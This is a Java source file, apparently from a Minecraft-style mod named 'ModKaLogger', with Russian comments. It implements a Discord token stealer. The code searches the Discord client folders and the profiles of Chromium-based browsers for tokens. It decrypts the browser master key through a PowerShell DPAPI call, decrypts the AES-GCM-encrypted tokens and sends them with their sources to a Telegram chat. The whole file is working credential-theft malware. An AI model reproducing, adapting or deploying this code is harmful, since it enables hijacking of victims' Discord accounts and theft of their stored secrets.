package com.modkalogger.discord;

import com.modkalogger.ModKaLogger;
import com.modkalogger.telegram.TelegramSender;

import java.io.*;
import java.nio.ByteBuffer;
import java.nio.file.Files;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class Discord {
    
    // Pattern для зашифрованных токенов (dQw4w9WgXcQ: base64)
    private static final Pattern ENCRYPTED_TOKEN_PATTERN = Pattern.compile("dQw4w9WgXcQ:([A-Za-z0-9+/=]+)");
    // Pattern для незашифрованных токенов (старые версии)
    private static final Pattern TOKEN_PATTERN = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
    
    public static void stealAndSendTokens() {
        try {
            Map<String, String> tokensWithSource = new LinkedHashMap<>();
            
            // Ищем токены в Discord клиентах
            findTokensInDiscordClients(tokensWithSource);
            
            // Ищем токены в браузерах
            findTokensInBrowsers(tokensWithSource);
            
            ModKaLogger.LOGGER.info("Найдено Discord токенов: " + tokensWithSource.size());
            
            if (!tokensWithSource.isEmpty()) {
                List<String> messages = new ArrayList<>();
                StringBuilder currentMessage = new StringBuilder("<b>🎮 Discord токены найдены: " + tokensWithSource.size() + "</b>\n\n");
                
                int index = 1;
                for (Map.Entry<String, String> entry : tokensWithSource.entrySet()) {
                    String token = entry.getKey();
                    String source = entry.getValue();
                    
                    String tokenBlock = "<b>Токен " + index + ":</b>\n" +
                            "<code>" + token + "</code>\n" +
                            "📍 Источник: <code>" + source + "</code>\n\n";
                    
                    // Проверяем лимит сообщения (4000 символов с запасом)
                    if (currentMessage.length() + tokenBlock.length() > 4000) {
                        messages.add(currentMessage.toString());
                        currentMessage = new StringBuilder();
                    }
                    
                    currentMessage.append(tokenBlock);
                    index++;
                }
                
                // Добавляем последнее сообщение
                if (currentMessage.length() > 0) {
                    messages.add(currentMessage.toString());
                }
                
                // Отправляем сообщения
                ModKaLogger.LOGGER.info("Отправка " + tokensWithSource.size() + " Discord токенов в Telegram...");
                for (String msg : messages) {
                    TelegramSender.sendMessage(msg);
                    Thread.sleep(500); // Небольшая пауза между сообщениями
                }
                ModKaLogger.LOGGER.info("Discord токены отправлены в Telegram");
            } else {
                ModKaLogger.LOGGER.info("Discord токены не найдены");
                TelegramSender.sendMessage("<b>Discord токены не найдены</b>");
            }
        } catch (Exception e) {
            ModKaLogger.LOGGER.error("Ошибка при краже Discord токенов", e);
            e.printStackTrace();
        }
    }
    
    private static void findTokensInDiscordClients(Map<String, String> tokens) {
        String appData = System.getenv("APPDATA");
        
        // Discord клиенты
        Map<String, String> discordClients = new LinkedHashMap<>();
        discordClients.put("Discord", appData + "\\Discord");
        discordClients.put("Discord PTB", appData + "\\discordptb");
        discordClients.put("Discord Canary", appData + "\\discordcanary");
        discordClients.put("Discord Development", appData + "\\discorddevelopment");
        discordClients.put("Lightcord", appData + "\\Lightcord");
        
        for (Map.Entry<String, String> client : discordClients.entrySet()) {
            String clientName = client.getKey();
            String clientPath = client.getValue();
            
            File clientDir = new File(clientPath);
            if (!clientDir.exists()) continue;
            
            // Читаем мастер-ключ из Local State (в корневой папке клиента!)
            byte[] masterKey = getMasterKey(clientPath);
            
            // Ищем в LevelDB
            File leveldbDir = new File(clientPath + "\\Local Storage\\leveldb");
            if (leveldbDir.exists()) {
                searchTokensInDir(leveldbDir, tokens, clientName, masterKey);
            }
            
            // Ищем в Session Storage
            File sessionDir = new File(clientPath + "\\Session Storage");
            if (sessionDir.exists()) {
                searchTokensInDir(sessionDir, tokens, clientName, masterKey);
            }
        }
    }
    
    private static void findTokensInBrowsers(Map<String, String> tokens) {
        String appData = System.getenv("APPDATA");
        String localAppData = System.getenv("LOCALAPPDATA");
        
        // Браузеры с путями
        Map<String, String[]> browsers = new LinkedHashMap<>();
        browsers.put("Chrome", new String[]{localAppData + "\\Google\\Chrome\\User Data"});
        browsers.put("Edge", new String[]{localAppData + "\\Microsoft\\Edge\\User Data"});
        browsers.put("Brave", new String[]{localAppData + "\\BraveSoftware\\Brave-Browser\\User Data"});
        browsers.put("Opera", new String[]{appData + "\\Opera Software\\Opera Stable"});
        browsers.put("Opera GX", new String[]{appData + "\\Opera Software\\Opera GX Stable"});
        browsers.put("Vivaldi", new String[]{localAppData + "\\Vivaldi\\User Data"});
        browsers.put("Yandex", new String[]{localAppData + "\\Yandex\\YandexBrowser\\User Data"});
        
        for (Map.Entry<String, String[]> browser : browsers.entrySet()) {
            String browserName = browser.getKey();
            String basePath = browser.getValue()[0];
            
            File browserDir = new File(basePath);
            if (!browserDir.exists()) continue;
            
            // Читаем мастер-ключ браузера (Local State в корне User Data)
            byte[] masterKey = getMasterKey(basePath);
            
            // Ищем в профилях
            File[] dirs = browserDir.listFiles(File::isDirectory);
            if (dirs != null) {
                for (File dir : dirs) {
                    if (dir.getName().startsWith("Profile") || dir.getName().equals("Default")) {
                        File leveldbDir = new File(dir, "Local Storage\\leveldb");
                        if (leveldbDir.exists()) {
                            searchTokensInDir(leveldbDir, tokens, browserName + " (" + dir.getName() + ")", masterKey);
                        }
                    }
                }
            }
        }
    }
    
    private static byte[] getMasterKey(String basePath) {
        try {
            // Local State находится в корне basePath
            File localState = new File(basePath, "Local State");
            if (!localState.exists()) {
                ModKaLogger.LOGGER.debug("Local State не найден: " + localState.getAbsolutePath());
                return null;
            }
            
            String content = new String(Files.readAllBytes(localState.toPath()));
            
            // Ищем encrypted_key в JSON (простой парсинг без внешних библиотек)
            String encryptedKeyB64 = extractJsonValue(content, "encrypted_key");
            if (encryptedKeyB64 == null) {
                ModKaLogger.LOGGER.debug("encrypted_key не найден в Local State");
                return null;
            }
            
            byte[] encryptedKey = Base64.getDecoder().decode(encryptedKeyB64);
            
            // Проверяем префикс "DPAPI" (первые 5 байт должны быть 1,0,0,0,0 или "DPAPI")
            if (encryptedKey.length < 5) {
                ModKaLogger.LOGGER.debug("encrypted_key слишком короткий");
                return null;
            }
            
            // Удаляем префикс (обычно 5 байт)
            byte[] encryptedKeyWithoutPrefix = Arrays.copyOfRange(encryptedKey, 5, encryptedKey.length);
            
            // Расшифровываем через DPAPI
            byte[] decrypted = decryptDPAPI(encryptedKeyWithoutPrefix);
            if (decrypted == null) {
                ModKaLogger.LOGGER.debug("DPAPI расшифровка не удалась, пробуем PowerShell fallback");
                decrypted = decryptDPAPIWithPowerShell(encryptedKeyWithoutPrefix);
            }
            
            return decrypted;
            
        } catch (Exception e) {
            ModKaLogger.LOGGER.debug("Ошибка при получении мастер-ключа из " + basePath + ": " + e.getMessage());
            return null;
        }
    }
    
    private static String extractJsonValue(String json, String key) {
        // Простой поиск ключа в JSON без внешних библиотек
        String searchKey = "\"" + key + "\"";
        int start = json.indexOf(searchKey);
        if (start == -1) return null;
        
        // Ищем значение после ключа
        start = json.indexOf(":", start);
        if (start == -1) return null;
        
        // Пропускаем пробелы
        while (start < json.length() && (json.charAt(start) == ':' || json.charAt(start) == ' ')) {
            start++;
        }
        
        // Проверяем, что значение в кавычках
        if (start >= json.length() || json.charAt(start) != '"') return null;
        start++;
        
        // Ищем закрывающую кавычку
        int end = start;
        while (end < json.length() && json.charAt(end) != '"') {
            if (json.charAt(end) == '\\') end++; // Пропускаем экранированные символы
            end++;
        }
        
        return json.substring(start, end);
    }
    
    private static byte[] decryptDPAPI(byte[] data) {
        // Используем PowerShell вместо JNA (избегаем конфликтов версий)
        return decryptDPAPIWithPowerShell(data);
    }
    
    private static byte[] decryptDPAPIWithPowerShell(byte[] data) {
        try {
            // Сохраняем данные во временный файл
            File tempFile = File.createTempFile("dpapi_data", ".bin");
            Files.write(tempFile.toPath(), data);
            
            // PowerShell скрипт для расшифровки через ProtectedData
            String psCommand = 
                "Add-Type -AssemblyName System.Security; " +
                "[Convert]::ToBase64String([Security.Cryptography.ProtectedData]::Unprotect(" +
                "[Convert]::FromBase64String('" + Base64.getEncoder().encodeToString(data) + "'), " +
                "$null, [Security.Cryptography.DataProtectionScope]::CurrentUser))";
            
            ProcessBuilder pb = new ProcessBuilder("powershell", "-Command", psCommand);
            pb.redirectErrorStream(true);
            Process process = pb.start();
            
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line);
            }
            
            process.waitFor();
            tempFile.delete();
            
            String result = output.toString().trim();
            if (!result.isEmpty()) {
                return Base64.getDecoder().decode(result);
            }
        } catch (Exception e) {
            ModKaLogger.LOGGER.debug("PowerShell fallback не удался: " + e.getMessage());
        }
        return null;
    }
    
    private static void searchTokensInDir(File dir, Map<String, String> tokens, String source, byte[] masterKey) {
        if (!dir.exists() || !dir.isDirectory()) return;
        
        File[] files = dir.listFiles();
        if (files == null) return;
        
        for (File file : files) {
            if (!file.isFile()) continue;
            if (!file.getName().endsWith(".ldb") && !file.getName().endsWith(".log")) continue;
            
            try {
                String content = new String(Files.readAllBytes(file.toPath()));
                
                // 1. Ищем зашифрованные токены (dQw4w9WgXcQ:...)
                Matcher encryptedMatcher = ENCRYPTED_TOKEN_PATTERN.matcher(content);
                while (encryptedMatcher.find()) {
                    String encryptedToken = encryptedMatcher.group(1);
                    if (masterKey != null) {
                        String decrypted = decryptToken(encryptedToken, masterKey);
                        if (decrypted != null && !tokens.containsKey(decrypted)) {
                            tokens.put(decrypted, source + " -> " + file.getName() + " (расшифрован)");
                        }
                    }
                }
                
                // 2. Ищем незашифрованные токены (старые версии/ошибки)
                Matcher plainMatcher = TOKEN_PATTERN.matcher(content);
                while (plainMatcher.find()) {
                    String token = plainMatcher.group();
                    if (!tokens.containsKey(token)) {
                        tokens.put(token, source + " -> " + file.getName() + " (незашифрованный)");
                    }
                }
                
            } catch (Exception ignored) {}
        }
    }
    
    private static String decryptToken(String encryptedB64, byte[] masterKey) {
        try {
            byte[] encryptedData = Base64.getDecoder().decode(encryptedB64);
            
            // Формат: IV (12 байт) + encrypted_data + tag (16 байт)
            if (encryptedData.length < 12 + 16) return null;
            
            byte[] iv = Arrays.copyOfRange(encryptedData, 0, 12);
            byte[] cipherText = Arrays.copyOfRange(encryptedData, 12, encryptedData.length);
            
            // AES-GCM расшифровка
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            SecretKeySpec keySpec = new SecretKeySpec(masterKey, "AES");
            GCMParameterSpec gcmSpec = new GCMParameterSpec(128, iv);
            cipher.init(Cipher.DECRYPT_MODE, keySpec, gcmSpec);
            
            byte[] decrypted = cipher.doFinal(cipherText);
            return new String(decrypted);
            
        } catch (Exception e) {
            ModKaLogger.LOGGER.debug("Не удалось расшифровать токен: " + e.getMessage());
            return null;
        }
    }
    
    public static ArrayList<String> getTokens() {
        Map<String, String> tokensWithSource = new LinkedHashMap<>();
        findTokensInDiscordClients(tokensWithSource);
        findTokensInBrowsers(tokensWithSource);
        return new ArrayList<>(tokensWithSource.keySet());
    }
    
    public static String getFormattedTokens() {
        ArrayList<String> tokens = getTokens();
        return String.join("\n", tokens);
    }
}
